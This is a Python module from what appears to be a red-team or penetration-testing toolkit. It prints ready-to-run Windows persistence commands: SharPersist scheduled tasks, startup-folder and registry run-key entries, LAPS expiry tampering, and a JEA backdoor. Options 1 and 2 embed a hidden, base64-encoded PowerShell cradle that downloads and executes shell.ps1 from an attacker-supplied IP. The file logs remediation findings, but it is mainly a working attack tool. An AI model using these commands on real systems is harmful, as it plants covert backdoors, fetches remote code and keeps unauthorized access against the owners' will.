"""
Module: Local Persistence
Techniques: SharPersist (schtask/startup/reg), LAPS expiry, JEA backdoor
"""
from utils.helpers import *
from config.settings import SESSION
import base64

def run():
    print_banner("LOCAL PERSISTENCE")
    print(f"""
  [1]  SharPersist — Scheduled Task
  [2]  SharPersist — Startup Folder
  [3]  SharPersist — Registry Run Key
  [4]  LAPS Expiry Extension
  [5]  JEA Persistence
  [6]  Generate Base64 Payload
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        attacker = prompt("Attacker IP")
        name     = prompt("Task name") or "WindowsUpdater"
        raw      = f'IEX ((new-object net.webclient).downloadstring("http://{attacker}/shell.ps1"))'
        b64      = base64.b64encode(raw.encode('utf-16-le')).decode()
        print(f"""
  {Y}SharPersist — Scheduled Task:{RST}

  .\\SharPersist.exe -t schtask \\
    -c "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" \\
    -a "-nop -w hidden -enc {b64}" \\
    -n "{name}" -m add -o hourly

  {Y}Verify:{RST}
  schtasks /query /tn "{name}" /fo list
""")
        add_finding("Scheduled Task Persistence", "High",
                    f"Persistent schtask '{name}' calls back to {attacker}",
                    "Audit scheduled tasks; monitor for new Task Scheduler entries")

    elif c == "2":
        attacker = prompt("Attacker IP")
        fname    = prompt("LNK filename") or "UserEnvSetup"
        raw      = f'IEX ((new-object net.webclient).downloadstring("http://{attacker}/shell.ps1"))'
        b64      = base64.b64encode(raw.encode('utf-16-le')).decode()
        print(f"""
  {Y}SharPersist — Startup Folder:{RST}

  .\\SharPersist.exe -t startupfolder \\
    -c "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" \\
    -a "-nop -w hidden -enc {b64}" \\
    -f "{fname}" -m add

  {Y}Location:{RST}
  C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
""")

    elif c == "3":
        exe_path = prompt("Backdoor EXE path (e.g. C:\\ProgramData\\Updater.exe)")
        name     = prompt("Registry value name") or "WindowsUpdater"
        print(f"""
  {Y}SharPersist — Registry Run Key:{RST}

  .\\SharPersist.exe -t reg -c "{exe_path}" -a "/q /n" \\
    -k "hkcurun" -v "{name}" -m add

  {Y}Verify:{RST}
  reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

  {Y}Alternative (direct reg command):{RST}
  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\
    /v "{name}" /t REG_SZ /d "{exe_path}" /f
""")
        add_finding("Registry Run Key Persistence", "High",
                    f"Run key '{name}' → {exe_path}",
                    "Monitor HKCU/HKLM Run keys; use autoruns for auditing")

    elif c == "4":
        machine  = prompt("Target computer (AD object name)")
        dc       = input_or_session("dc_ip", "DC IP")
        dom      = input_or_session("domain", "Domain")
        user     = input_or_session("username", "Username")
        pw       = input_or_session("password", "Password")
        info("Extending LAPS password expiry to prevent rotation:")
        print(f"""
  {Y}PowerView (on Windows):{RST}
  Set-DomainObject -Identity {machine} \\
    -Set @{{"ms-mcs-admpwdexpirationtime"="232609935231523081"}}

  {Y}Via LDAP (Linux):{RST}
  ldapmodify -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' <<EOF
  dn: CN={machine},CN=Computers,DC={dom.replace(".", ",DC=")}
  changetype: modify
  replace: ms-mcs-admpwdexpirationtime
  ms-mcs-admpwdexpirationtime: 232609935231523081
  EOF
""")
        add_finding("LAPS Persistence (Expiry Extension)", "High",
                    f"LAPS rotation prevented on {machine}",
                    "Monitor ms-mcs-admpwdexpirationtime for anomalous far-future values")

    elif c == "5":
        target_comp   = prompt("Target computer")
        backdoor_user = prompt("User to grant full JEA access")
        print(f"""
  {Y}JEA Persistence (run on target machine as admin):{RST}

  Import-Module .\\Set-JEAPermissions.ps1
  Set-JEAPermissions -ComputerName {target_comp} -SamAccountName {backdoor_user} -Verbose

  {Y}Backdoor connect:{RST}
  Enter-PSSession -ComputerName {target_comp} -ConfigurationName microsoft.powershell64
""")
        add_finding("JEA Persistence Backdoor", "Critical",
                    f"Full JEA access granted to {backdoor_user} on {target_comp}",
                    "Audit PSSessionConfiguration; monitor Set-PSSessionConfiguration events")

    elif c == "6":
        cmd = prompt("PowerShell command to encode")
        b64 = base64.b64encode(cmd.encode('utf-16-le')).decode()
        success(f"Encoded payload:")
        print(f"\n  powershell -nop -w hidden -enc {b64}\n")

    pause()
